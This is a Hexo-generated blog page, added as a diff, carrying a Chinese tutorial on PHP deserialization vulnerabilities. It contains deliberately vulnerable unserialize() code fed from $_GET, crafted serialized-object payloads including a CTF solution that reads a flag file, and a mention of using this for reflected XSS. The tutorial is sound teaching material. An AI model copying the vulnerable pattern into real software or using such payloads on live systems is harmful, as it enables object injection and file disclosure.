@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class="logo" href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id="post">
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>Untitled</h1>
+          <div class="post-meta">
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/03/25</time>
+            
+            
+          </div>
+          <h1 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h1><p>序列化说通俗点就是把一个对象变成可以传输的字符串。<br>和序列化有关的函数有：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">serialize() <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">unserialize() <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">json_encode() <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">json_decode() <span class="comment">////反序列化</span></span><br></pre></td></tr></table></figure></p>
+<p>使用json来讲一个例子。</p>
+<p>虽然序列化Json和我们讲PHP反序列化的漏洞没有什么关系。但是在理解序列化这个概念和之后的内容会有所帮助</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** Created by Phpstorm. ...**/</span></span><br><span class="line">  </span><br><span class="line">  $book = <span class="keyword">array</span>(<span class="string">'book1'</span>=&gt;<span class="string">'Harry Potter'</span>,<span class="string">'book2'</span>=&gt;<span class="string">'Time'</span>,<span class="string">'book3'</span>=&gt;<span class="string">'History'</span>);</span><br><span class="line">  $json = json_encode($book);</span><br><span class="line">  <span class="keyword">echo</span> $json;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>返回的内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"book1"</span>:<span class="string">"Harry Potter"</span>,<span class="string">"book2"</span>:<span class="string">"Time"</span>,<span class="string">"book3"</span>:<span class="string">"History"</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>也就是说我们所上传的这个数组被序列化成一个字符串。便于储存，下次需要使用的时候，我们再反序列化就好了。</p>
+<p>接下来我们要开始深入一步，来讲讲如何把一个对象序列化成一串字符串。</p>
+<p>假设，我们写了一个class，这个class里面存有一些变量。当这个class被实例化了之后，在使用过程中里面的一些变量值发生了改变。以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等着下一次要用它的时候再一次被调用的话，浪费系统资源。当我们写一个小型的项目可能没有太大的影响，但是随着项目的壮大，一些小问题被放大了之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再放他出来就好了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** Created by Phpstorm. ...**/</span></span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Democlass</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">  	<span class="keyword">public</span> $name = <span class="string">"Notyear"</span>;</span><br><span class="line">  	<span class="keyword">public</span> $sex = <span class="string">"man"</span>;</span><br><span class="line">  	<span class="keyword">public</span> $age = <span class="string">"7"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $example = <span class="keyword">new</span> Democlass();</span><br><span class="line">  $example-&gt;name = <span class="string">"lily"</span>;</span><br><span class="line">  $example-&gt;sex = <span class="string">"woman"</span>;</span><br><span class="line">  $example-&gt;age = <span class="string">"18"</span>;</span><br><span class="line"><span class="comment">//我们想要把这个实例存起来，所以我们需要序列化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> serialize($example);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>返回的内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">9</span>:<span class="string">"Democlass"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">4</span>:<span class="string">"lily"</span>;s:<span class="number">3</span>:<span class="string">"sex"</span>;s:<span class="number">5</span>:<span class="string">"woman"</span>;s:<span class="number">3</span>:<span class="string">"age"</span>;s:<span class="number">2</span>:<span class="string">"18"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/blogs/反序列化/PHP反序列化/1.png" alt=""></p>
+<p>然后再序列化回来：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** Created by Phpstorm. ...**/</span></span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Democlass</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">  	<span class="keyword">public</span> $name = <span class="string">"Notyear"</span>;</span><br><span class="line">  	<span class="keyword">public</span> $sex = <span class="string">"man"</span>;</span><br><span class="line">  	<span class="keyword">public</span> $age = <span class="string">"7"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $example = <span class="keyword">new</span> Democlass();</span><br><span class="line">  $example-&gt;name = <span class="string">"lily"</span>;</span><br><span class="line">  $example-&gt;sex = <span class="string">"woman"</span>;</span><br><span class="line">  $example-&gt;age = <span class="string">"18"</span>;</span><br><span class="line"><span class="comment">//我们想要把这个实例存起来，所以我们需要序列化</span></span><br><span class="line"></span><br><span class="line">    $val = serialize($example);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化回来</span></span><br><span class="line"></span><br><span class="line">    $newExample = unserialize($val);</span><br><span class="line">    <span class="keyword">echo</span> $newExample-&gt;age;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>返回如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18</span><br></pre></td></tr></table></figure></p>
+<h1 id="反序列化漏洞的产生原因"><a href="#反序列化漏洞的产生原因" class="headerlink" title="反序列化漏洞的产生原因"></a>反序列化漏洞的产生原因</h1><p>如果服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进魔术方法里面的话，就容易造成很严重的漏洞了。</p>
+<p>魔法函数一般是以__开头，通常会因为某些条件而触发不用我们手动调用：</p>
+<p>常见魔术方法如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">__wakeup() 将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">__clone() 当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">__autoload() 尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">__debugInfo() 打印所需调试信息</span><br><span class="line"></span><br><span class="line">__isset() 当对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时调用</span><br><span class="line"></span><br><span class="line">__unset() 当对不可访问属性调用<span class="keyword">unset</span>()时被调用。</span><br><span class="line"></span><br><span class="line">__call() 在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__get() 获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__set() 设置一个类的成员变量时调用</span><br></pre></td></tr></table></figure></p>
+<p>在研究反序列化漏洞的时候，碰见这几个魔法函数就要仔细研究研究了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化之后立即被调用</span><br></pre></td></tr></table></figure></p>
+<p>这些就是我们要关注的几个魔术方法了，如果服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了。</p>
+<p>举个例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">"demo"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'test'</span>];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>传入数据：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?test=O:1:"A":1:&#123;s:4:"test";s:5:"hello";&#125;</span><br></pre></td></tr></table></figure></p>
+<p>返回：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello</span><br></pre></td></tr></table></figure></p>
+<p>就能控制echo出的变量，比如你能拿这个来进行反射型xss</p>
+<h1 id="CTF实战"><a href="#CTF实战" class="headerlink" title="CTF实战"></a>CTF实战</h1><p>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">    $x = <span class="keyword">new</span> Shield();</span><br><span class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">        $x = unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*其中包含了shield.php，看到unserialize()就要想到反序列化漏洞，寻找魔术方法的位置。</span></span><br><span class="line"><span class="comment">整个代码基本就是，我们传入的数据，被反序列化后，存于实例x中。而flag在pctf.php中，又有$x-&gt;readfile(),也就是说输入的字符串数据应该也是shield的实例序列化的结果。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//shield.php如下：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//flag is in pctf.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">shield.php中返回成员变量file的内容</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
+<p>所以我们的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.jb51.net/article/96167.htm" target="_blank" rel="noopener">https://www.jb51.net/article/96167.htm</a><br><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#什么是反序列化"><span class="toc-number">1.</span> <span class="toc-text">什么是反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反序列化漏洞的产生原因"><span class="toc-number">2.</span> <span class="toc-text">反序列化漏洞的产生原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF实战"><span class="toc-number">3.</span> <span class="toc-text">CTF实战</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/blogs/反序列化/PHP反序列化.html";
+  var disqus_url = "http://yoursite.com/blogs/反序列化/PHP反序列化.html";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+
+</body>
+</html>
